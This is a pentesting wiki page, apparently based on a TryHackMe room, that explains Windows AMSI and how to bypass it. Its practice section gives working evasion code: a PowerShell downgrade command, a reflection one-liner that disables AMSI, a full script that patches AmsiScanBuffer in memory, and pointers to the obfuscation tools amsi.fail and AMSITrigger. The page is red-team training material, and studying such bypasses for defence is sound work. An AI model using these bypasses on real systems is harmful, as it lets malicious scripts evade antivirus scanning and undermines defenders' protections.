# AMSI bypass

## Theory

With the release of PowerShell, Microsoft released [AMSI (Anti-Malware Scan Interface)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). It is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.

### How it works ?

AMSI (Anti-Malware Scan Interface) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. The [CLR (Common Language Runtime)](https://learn.microsoft.com/en-us/dotnet/standard/clr) and [DLR (Dynamic Language Runtime)](https://learn.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview) are the runtimes for .NET.

AMSI is fully integrated into the following Windows components:

* User Account Control, or UAC
* PowerShell
* Windows Script Host (wscript and cscript)
* JavaScript and VBScript
* Office VBA macros

The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being instrumented.\
![](../../../.gitbook/assets/35e16d45ce27145fcdf231fdb8dcb35e.png)

This is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below.\
![](../../../.gitbook/assets/efca9438e858f0476a4ffd777c36501a.png)

{% hint style="danger" %}
Note: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented.
{% endhint %}

## Practice

To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/cobbr/InsecurePowerShell) maintained by [Cobbr](https://github.com/cobbr) which is a GitHub fork of PowerShell with security feature removed, and compare it with an [offical PowerShell GitHub](https://github.com/PowerShell/PowerShell).

### PowerShell Downgrade

The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.\
Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By "downgrading" the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.

{% tabs %}
{% tab title="Powershell" %}
We can simply use this command to downgrad powershell. This attacked is used in popular tools such as [Unicorn](https://github.com/trustedsec/unicorn)

```bash
PowerShell -Version 2
```

{% hint style="danger" %}
Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
{% endhint %}
{% endtab %}
{% endtabs %}

### PowerShell Reflection

Reflection allows a user or administrator to access and interact with .NET assemblies. It can be abused to modify and identify information from valuable DLLs.\
The AMSI utilities for PowerShell are stored in the **AMSIUtils** .NET assembly located in **System.Management.Automation.AmsiUtils**.

{% tabs %}
{% tab title="Powershell" %}
Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endtab %}
{% endtabs %}

### Patching AMSI

AMSI is primarily instrumented and loaded from **amsi.dll**. This dll can be abused and forced to point to a response code we want. The **AmsiScanBuffer** function provides us the hooks and functionality we need to access the pointer/buffer for the response code.\
AmsiScanBuffer is vulnerable because amsi.dll is loaded into the PowerShell process at startup; our session has the same permission level as the utility. AmsiScanBuffer will scan a "buffer" of suspected code and report it to amsi.dll to determine the response. We can control this function and overwrite the buffer with a clean return code.

{% tabs %}
{% tab title="C#" %}
At a high-level AMSI patching can be broken up into four steps,

* Obtain handle of amsi.dll
* Get process address of AmsiScanBuffer
* Modify memory protections of AmsiScanBuffer
* Write opcodes to AmsiScanBuffer

```bash
$MethodDefinition = "
    [DllImport(`"kernel32`")] // Import DLL where API call is stored
    public static extern IntPtr GetProcAddress( // API Call to import
        IntPtr hModule, // Handle to DLL module
        string procName // function or variable to obtain
    );

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(
        string lpModuleName // Module to obtain handle
    );

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress, // Address of region to modify
        UIntPtr dwSize, // Size of region
        uint flNewProtect, // Memory protection options
        out uint lpflOldProtect // Pointer to store previous protection options
    );
";
//Load the API calls
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;

//Identify where amsi.dll is located and how to get to the function
$handle = [Win32.Kernel32]::GetModuleHandle(
	'amsi.dll' // Obtains handle to amsi.dll
);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
	$handle, // Handle of amsi.dll
	'AmsiScanBuffer' // API call to obtain
);

//Modify the memory protection of the AmsiScanBuffer process region.
[UInt32]$Size = 0x5; // Size of region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect(
	$BufferAddress, // Point to AmsiScanBuffer
	$Size, // Size of region
	$ProtectFlag, // Enables R or RW access to region
	[Ref]$OldProtectFlag // Pointer to store old options
); 

//Overwrite the buffer
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(
	$buf, // Opcodes/array to write
	0, // Where to start copying in source array 
	$BufferAddress, // Where to write (AsmiScanBuffer)
	6 // Number of elements/opcodes to write
); 
```
{% endtab %}
{% endtabs %}

### AMSI Bypass Tools

While it is preferred to use the previous methods shown, attackers can use other automated tools to break AMSI signatures or compile a bypass.

{% tabs %}
{% tab title="AMSI.Fail" %}
[amsi.fail](https://amsi.fail/) will compile and generate a PowerShell bypass from a collection of known bypasses.\
From amsi.fail, "AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures."
{% endtab %}

{% tab title="AMSITrigger" %}
[AMSITrigger](https://github.com/RythmStick/AMSITrigger) allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.

```bash
C:\Users\v4resk\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://tryhackme.com/room/runtimedetectionevasion" %}
